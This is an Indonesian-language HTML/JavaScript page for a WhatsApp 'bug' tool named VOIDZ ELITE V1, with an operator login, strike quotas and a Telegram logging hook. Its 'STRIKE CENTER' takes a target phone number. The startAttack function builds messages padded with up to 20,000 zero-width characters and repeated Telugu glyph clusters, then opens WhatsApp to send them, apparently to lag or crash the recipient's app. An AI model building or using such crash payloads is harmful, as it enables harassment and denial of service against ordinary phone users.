<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VOIDZ ELITE V1 - SUPREME</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --fire: #ff4500; --neon: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.95); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
        
        body { background: #000; color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
        
        /* CANVAS ABU ROKOK - LAYER TERBAWAH */
        #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }

        /* CONTENT LAYER - DI ATAS PARTIKEL */
        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; background: transparent; }
        .neon-red { color: var(--neon); text-shadow: 0 0 10px var(--neon); font-family: 'Orbitron'; font-weight: 900; }
        
        /* LOGIN PAGE */
        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; }
        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); box-shadow: 0 10px 30px rgba(0,0,0,0.8); position: relative; z-index: 20; }
        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; transition: 0.3s; }
        .input-box:focus { border-color: var(--fire); }

        /* BUTTON IGNITE - ANTI MACET */
        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; transition: 0.3s; position: relative; z-index: 30; display: block; }
        .btn-main:active { transform: scale(0.95); }
        .btn-main:disabled { background: #444; color: #888; cursor: not-allowed; }

        /* DASHBOARD - FONT GEDE */
        .tab-content { display: none; padding: 20px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
        .active-tab { display: block; }
        .home-info { background: var(--card); border: 1px solid #222; padding: 20px; border-radius: 15px; border-left: 6px solid var(--fire); margin-top: 25px; }
        .status-item { margin-bottom: 15px; display: flex; flex-direction: column; border-bottom: 1px solid #111; padding-bottom: 8px; }
        .status-label { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 1px; font-family: 'Orbitron'; }
        .status-value { font-size: 20px; font-weight: 900; color: #fff; font-family: 'Orbitron'; }
        .status-value.highlight { color: var(--fire); text-shadow: 0 0 10px var(--fire); }

        /* NAVIGATION */
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; cursor: pointer; }
        .nav-btn.active { color: var(--fire); }

        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
        .modal-content { background: #0a0a0a; padding: 25px; border: 1px solid var(--fire); width: 100%; max-width: 320px; border-radius: 15px; }
    </style>
</head>
<body>
    <canvas id="ash-canvas"></canvas>
    
    <div id="notif-box" style="position:fixed; top:15px; left:15px; z-index:100000;"></div>

    <div class="content-layer">
        <div id="loginPage">
            <div class="login-box">
                <img src="login.jpg" style="width:70px; height:70px; border-radius:50%; border:2px solid var(--fire); margin-bottom:15px;" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
                <h2 class="neon-red" style="font-size: 16px; margin-bottom: 20px;">VOIDZ ELITE V1</h2>
                <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
                <button onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
                <div style="margin-top:15px; display:flex; flex-direction:column; gap:5px;">
                    <a href="https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U" style="color:var(--fire); font-size:10px; text-decoration:none; font-weight:bold;">SALURAN WA</a>
                    <a href="https://wa.me/6285718241306" style="color:#444; font-size:9px; text-decoration:none;">CONTACT ADMIN</a>
                </div>
            </div>
        </div>

        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
            <div id="tabHOME" class="tab-content active-tab">
                <div class="header-title neon-red" style="text-align:center; margin-top:40px; font-size:20px;">OPERATOR PANEL</div>
                
                <div class="home-info">
                    <div class="status-item">
                        <span class="status-label">Operator ID</span>
                        <span id="uName" class="status-value highlight">...</span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">Rank</span>
                        <span id="uRole" class="status-value">...</span>
                    </div>
                    <div class="status-item" style="border:none; padding:0;">
                        <span class="status-label">Strike Quota</span>
                        <span id="uQuota" class="status-value highlight">...</span>
                    </div>
                </div>

                <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:20px;"></div>
            </div>

            <div id="tabATTACK" class="tab-content">
                <div class="header-title neon-red" style="text-align:center; margin-top:20px;">STRIKE CENTER</div>
                <div style="background:var(--card); padding:20px; border-radius:15px; border-top:2px solid var(--fire); margin-top:20px;">
                    <input type="text" id="targetBug" class="input-box" placeholder="Target WA (628xxx)">
                    <select id="bugType" class="input-box">
                        <option value="VOIDZ_SUPREME">üíÄ VOIDZ SUPREME (ULTIMATE)</option>
                        <option value="LAG_TEXT">üî• LAG TEXT (V1)</option>
                        <option value="RENDER_CRASH">‚ùÑÔ∏è RENDER CRASH (V2)</option>
                    </select>
                    <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
                </div>
            </div>
        </div>

        <nav id="bottomNav" class="bottom-nav">
            <div class="nav-btn active" onclick="switchTab('home', this)"><i class="fas fa-home"></i><span>HOME</span></div>
            <div class="nav-btn" onclick="switchTab('attack', this)"><i class="fas fa-skull"></i><span>ATTACK</span></div>
            <div id="btnConfigNav" class="nav-btn" onclick="openConfig()" style="display:none;"><i class="fas fa-cogs"></i><span>CONFIG</span></div>
        </nav>
    </div>

    <div id="modalConfig" class="modal">
        <div class="modal-content">
            <h3 class="neon-red" style="font-size:14px; text-align:center; margin-bottom:15px;">SYSTEM CONFIG</h3>
            <input type="text" id="cfgBin" class="input-box" placeholder="JSONBin ID">
            <input type="password" id="cfgKey" class="input-box" placeholder="Master Key">
            <input type="text" id="cfgTeleToken" class="input-box" placeholder="Tele Bot Token">
            <input type="text" id="cfgTeleID" class="input-box" placeholder="Tele Chat ID">
            <button class="btn-main" onclick="saveConfig()">SAVE & REBOOT</button>
            <button onclick="closeModal('modalConfig')" style="width:100%; background:none; border:none; color:#444; font-size:9px; margin-top:10px;">CANCEL</button>
        </div>
    </div>

    <script>
        // CONFIG & DB
        let BIN_ID = localStorage.getItem('cfg_bin') || '';
        let API_KEY = localStorage.getItem('cfg_key') || '';
        let TELE_TOKEN = localStorage.getItem('cfg_tele_token') || '';
        let TELE_ID = localStorage.getItem('cfg_tele_id') || '';
        let DB = {}; let USER = {};

        // 1. ENGINE PARTIKEL (ABU ROKOK)
        const canvas = document.getElementById('ash-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function initParts() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            particles = [];
            for(let i=0; i<70; i++) {
                particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, sy: Math.random()*0.4+0.1, o: Math.random()*0.5 });
            }
        }
        function drawParts() {
            ctx.clearRect(0,0,canvas.width, canvas.height);
            particles.forEach(p => {
                ctx.fillStyle = `rgba(200, 200, 200, ${p.o})`;
                ctx.fillRect(p.x, p.y, p.s, p.s);
                p.y -= p.sy; if(p.y < 0) p.y = canvas.height;
            });
            requestAnimationFrame(drawParts);
        }
        initParts(); drawParts();
        window.addEventListener('resize', initParts);

        // 2. CORE FUNCTIONS
        function notify(m) {
            const b = document.getElementById('notif-box');
            const n = document.createElement('div');
            n.style = "background:rgba(20,0,0,0.9); border-left:3px solid var(--fire); padding:10px; color:#fff; font-size:10px; margin-bottom:5px; border-radius:4px; box-shadow: 0 5px 15px rgba(0,0,0,0.5);";
            n.innerText = m; b.appendChild(n); setTimeout(() => n.remove(), 3000);
        }

        async function sendTele(act, msg) {
            if(!TELE_TOKEN || !TELE_ID) return;
            const text = `üöÄ *VOIDZ ELITE V1*\n\nüìå *ACTION:* ${act}\nüìù *DETAIL:* ${msg}`;
            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELE_ID, text: text, parse_mode: 'Markdown' })
            }).catch(() => {});
        }

        // 3. AUTH SYSTEM (IGNITE)
        async function auth() {
            const u = document.getElementById('lUser').value.trim();
            const p = document.getElementById('lPass').value.trim();
            const btn = document.getElementById('btnLog');

            if(!BIN_ID) return notify("CONFIG KOSONG! ISI DI MODAL CONFIG.");
            if(!u || !p) return notify("LENGKAPI DATA!");

            btn.disabled = true; btn.innerText = "IGNITING...";

            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: {'X-Master-Key': API_KEY, 'X-Bin-Meta': false}
                });
                if(!res.ok) throw "DATABASE_ERROR";
                DB = await res.json();

                if(DB[u] && DB[u].pw === p) {
                    USER = { id: u, ...DB[u] };
                    document.getElementById('loginPage').style.display = 'none';
                    document.getElementById('mainApp').style.display = 'block';
                    document.getElementById('bottomNav').style.display = 'flex';
                    if(USER.role === 'owner') document.getElementById('btnConfigNav').style.display = 'flex';
                    
                    renderHome();
                    sendTele("USER LOGIN", `Operator [${u}] telah masuk.`);
                } else {
                    notify("ID/KEY SALAH!"); btn.disabled = false; btn.innerText = "IGNITE";
                }
            } catch(e) {
                notify("ERROR: " + e);
                btn.disabled = false; btn.innerText = "IGNITE";
            }
        }

        function renderHome() {
            document.getElementById('uName').innerText = USER.id;
            document.getElementById('uRole').innerText = USER.role.toUpperCase();
            document.getElementById('uQuota').innerText = USER.role === 'owner' ? 'INFINITY' : USER.quota;
            
            const m = document.getElementById('menuContainer'); m.innerHTML = "";
            m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; border:1px solid #333; border-radius:10px; text-align:center;"><i class="fas fa-power-off"></i><br><span style="font-size:8px;">LOGOUT</span></div>`;
        }

        // 4. STRIKE SYSTEM
        function startAttack() {
            const t = document.getElementById('targetBug').value.trim();
            const type = document.getElementById('bugType').value;
            if(!t) return notify("TARGET KOSONG!");
            if(USER.role !== 'owner' && USER.quota <= 0) return notify("QUOTA HABIS!");

            sendTele("STRIKE", `Target: ${t} | Type: ${type} | Ops: ${USER.id}`);
            notify("STRIKE EXECUTED!");

            let payload = (type === "VOIDZ_SUPREME") ? 
                "VOIDZ_SUPREME" + "\u200B".repeat(15000) + "‡∞ú‡±ç‡∞û‡∞æ".repeat(500) : 
                "VOIDZ_LAG" + "\u200B".repeat(20000);

            setTimeout(() => {
                window.open(`https://api.whatsapp.com/send?phone=${t.replace(/\D/g,'')}&text=${encodeURIComponent(payload)}`, '_blank');
            }, 1000);
        }

        // 5. UI CONTROLLER
        function switchTab(t, el) {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab'));
            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab');
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            el.classList.add('active');
        }
        function openConfig() { document.getElementById('modalConfig').style.display = 'flex'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
        function saveConfig() {
            localStorage.setItem('cfg_bin', document.getElementById('cfgBin').value.trim());
            localStorage.setItem('cfg_key', document.getElementById('cfgKey').value.trim());
            localStorage.setItem('cfg_tele_token', document.getElementById('cfgTeleToken').value.trim());
            localStorage.setItem('cfg_tele_id', document.getElementById('cfgTeleID').value.trim());
            location.reload();
        }
    </script>
</body>
</html>
